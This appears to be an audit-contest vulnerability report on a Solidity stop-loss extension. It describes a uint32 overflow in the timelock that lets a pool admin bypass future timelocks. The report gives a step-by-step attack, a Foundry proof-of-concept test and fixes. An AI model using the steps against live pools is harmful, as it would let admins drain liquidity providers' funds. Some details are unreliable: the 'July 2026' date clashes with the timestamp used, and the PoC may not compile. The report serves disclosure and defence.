The vulnerability is real. Here is the full analysis:

---

### Title
Pool Admin Can Bypass All Future Timelocks via uint32 Overflow in `_afterTimelock` — (`metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol`)

---

### Summary

`_afterTimelock` truncates `block.timestamp + timelock` to `uint32` with no overflow guard, and there is no upper-bound validation on the `timelock` value. A pool admin can set `timelock = type(uint32).max` (a valid `uint32`), causing the addition to overflow and produce a **past** timestamp as `executeAfter`. Every subsequent `_requireElapsed` check then passes immediately, permanently disabling the timelock protection for all future drawdown, decay, and watermark proposals.

---

### Finding Description

`_afterTimelock` computes the execution deadline as:

```solidity
// OracleValueStopLossExtension.sol line 297-299
function _afterTimelock(address pool_) private view returns (uint32) {
    return uint32(block.timestamp + oracleStopLossConfig[pool_].timelock);
}
``` [1](#0-0) 

`block.timestamp` is `uint256`; `timelock` is `uint32`. The addition is performed in `uint256` and then **silently truncated** to `uint32`. No cap or overflow check exists.

`_requireElapsed` then compares the stored `uint32` against the current `uint256` `block.timestamp`:

```solidity
// line 301-303
function _requireElapsed(uint32 executeAfter) private view {
    if (block.timestamp < executeAfter) revert OracleStopLossTimelockNotElapsed(executeAfter, block.timestamp);
}
``` [2](#0-1) 

The `uint32` is implicitly promoted to `uint256` for the comparison. If `executeAfter` wrapped to a past value, the condition `block.timestamp < executeAfter` is false and the check passes immediately.

There is **no validation** on the `timelock` value in either `initialize` or `proposeOracleStopLossTimelock`:

```solidity
// initialize, line 56-62 — validates drawdown and decay but NOT timelock
(uint32 drawdownE6, uint32 decayPerSecondE8, uint32 timelock) = abi.decode(data, (uint32, uint32, uint32));
_validateDrawdown(drawdownE6);
_validateDecay(decayPerSecondE8);
// no _validateTimelock
``` [3](#0-2) 

```solidity
// proposeOracleStopLossTimelock, line 78-84 — no validation on newTimelock
function proposeOracleStopLossTimelock(address pool_, uint32 newTimelock) external onlyPoolAdmin(pool_) {
    PoolStopLossSchedule storage sched = _initializedSchedule(pool_);
    uint32 executeAfter = _afterTimelock(pool_);
    sched.pendingTimelock = newTimelock;
    sched.pendingTimelockExecuteAfter = executeAfter;
``` [4](#0-3) 

**Overflow arithmetic (exploitable today, July 2026):**

| Variable | Value |
|---|---|
| `block.timestamp` (approx. now) | `1,753,000,000` |
| `type(uint32).max` | `4,294,967,295` |
| Overflow threshold for `timelock` | `> 2,541,967,295` (~80.6 years) |
| `uint32(1,753,000,000 + 4,294,967,295)` | `= uint32(6,047,967,295)` = `1,752,999,999` |
| Result | Past timestamp — `_requireElapsed` passes immediately |

---

### Impact Explanation

The timelock is the sole mechanism protecting LPs from sudden pool admin parameter changes. The contract's own NatSpec states: *"Drawdown and decay changes are timelocked so LPs can react."* [5](#0-4) 

Once the malicious timelock is installed, the pool admin can:
- Immediately raise `drawdownE6` to `1e6` (100%), disabling the stop-loss entirely
- Immediately set `decayPerSecondE8` to `1e8` (100%/s), collapsing all watermarks to zero in one block
- Immediately reset high watermarks to arbitrarily low values

All of these allow the pool admin to drain LP value without the LP protection window the timelock is supposed to guarantee. This is a direct admin-boundary break under the contest's allowed impact gate.

---

### Likelihood Explanation

The attack requires the pool admin to:
1. Call `proposeOracleStopLossTimelock(pool, type(uint32).max)` — one transaction
2. Wait for the **current** timelock to elapse (the only friction)
3. Call `executeOracleStopLossTimelock` — one transaction

After step 3, all future timelocks are permanently bypassed. The current timelock is the only window LPs have to notice and exit. If the initial timelock is short (e.g., 0 or a few hours), the attack is nearly instant.

---

### Recommendation

1. Add an upper-bound cap on `timelock` in both `initialize` and `proposeOracleStopLossTimelock`, e.g. `type(uint32).max / 2` or a practical maximum like 365 days.
2. Add an explicit overflow check in `_afterTimelock`:
   ```solidity
   function _afterTimelock(address pool_) private view returns (uint32) {
       uint256 result = block.timestamp + oracleStopLossConfig[pool_].timelock;
       if (result > type(uint32).max) revert TimelockOverflow();
       return uint32(result);
   }
   ```
3. Alternatively, widen `executeAfter` fields to `uint64` throughout `PoolStopLossSchedule` and `PendingHighWatermarks`.

---

### Proof of Concept

```solidity
// Foundry test — set block.timestamp to overflow boundary
function test_timelockBypassViaUint32Overflow() public {
    // Warp to a timestamp where type(uint32).max timelock overflows
    uint256 ts = type(uint32).max - 100; // 4294967195
    vm.warp(ts);

    // Pool admin proposes timelock = type(uint32).max (valid uint32, no validation)
    // Assume current timelock is 0 so it executes immediately
    vm.startPrank(admin);
    extension.proposeOracleStopLossTimelock(address(mockPool), type(uint32).max);
    extension.executeOracleStopLossTimelock(address(mockPool));

    // Now propose a drawdown change — executeAfter wraps to a past value
    extension.proposeOracleStopLossDrawdown(address(mockPool), 1_000_000);

    // Read the stored executeAfter — it should be < block.timestamp
    (,, uint32 pendingDrawdownExecuteAfter,) = extension.poolStopLossSchedule(address(mockPool));
    // uint32(4294967195 + 4294967295) = uint32(8589934490) = 8589934490 - 4294967296 = 4294967194
    // 4294967194 < 4294967195 (current ts) → past timestamp
    assertLt(pendingDrawdownExecuteAfter, block.timestamp);

    // Execute immediately — no timelock elapsed, but check passes
    extension.executeOracleStopLossDrawdown(address(mockPool)); // succeeds, no revert
    vm.stopPrank();

    assertEq(extension.oracleStopLossConfig(address(mockPool)).drawdownE6, 1_000_000);
}
```

### Citations

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L16-17)
```text
///         can react; monitor at least as often as the timelock or trust the pool admin.
/// @dev Value formulas (Q64.64 mid = token1 per token0), per-share in bin scaled units:
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L56-62)
```text
    (uint32 drawdownE6, uint32 decayPerSecondE8, uint32 timelock) = abi.decode(data, (uint32, uint32, uint32));
    _validateDrawdown(drawdownE6);
    _validateDecay(decayPerSecondE8);

    oracleStopLossConfig[pool] = PoolStopLossConfig({
      drawdownE6: drawdownE6, decayPerSecondE8: decayPerSecondE8, timelock: timelock, initialized: true
    });
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L78-84)
```text
  function proposeOracleStopLossTimelock(address pool_, uint32 newTimelock) external onlyPoolAdmin(pool_) {
    PoolStopLossSchedule storage sched = _initializedSchedule(pool_);
    uint32 executeAfter = _afterTimelock(pool_);
    sched.pendingTimelock = newTimelock;
    sched.pendingTimelockExecuteAfter = executeAfter;
    emit OracleStopLossTimelockProposed(pool_, newTimelock, executeAfter);
  }
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L297-299)
```text
  function _afterTimelock(address pool_) private view returns (uint32) {
    return uint32(block.timestamp + oracleStopLossConfig[pool_].timelock);
  }
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L301-303)
```text
  function _requireElapsed(uint32 executeAfter) private view {
    if (block.timestamp < executeAfter) revert OracleStopLossTimelockNotElapsed(executeAfter, block.timestamp);
  }
```
